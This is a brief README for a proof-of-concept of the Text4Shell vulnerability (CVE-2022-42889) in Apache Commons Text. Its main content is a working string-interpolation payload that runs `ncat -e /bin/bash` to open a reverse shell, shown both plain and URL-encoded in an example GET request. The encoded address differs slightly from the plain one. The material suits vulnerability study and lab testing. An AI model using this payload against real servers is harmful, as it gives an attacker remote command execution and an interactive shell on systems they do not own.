# CVE-2022-42889 Text4Shell
This vulnerability is found in Apache Commons Text v1.5-1.9 and allows a remote attacker to execute arbitrary code IF user controlled input makes its way directly into a `StringSubstituter` which is fairly rare to find in the wild.

The payload used in this POC is:
`${script:javascript:java.lang.Runtime.getRuntime().exec('ncat -e /bin/bash 0.0.0.0 4444')}`

Which looks like this when part of an HTTP GET request:
`http://localhost:8080/Text4Shell/?search=$%7Bscript:javascript:java.lang.Runtime.getRuntime().exec(%27ncat%20-e%20/bin/bash%2000.0.0.0%204444%27)%7D`

The app was built in Eclipse, a tutorial will be added soon if you want to build, run and test it yourself locally.
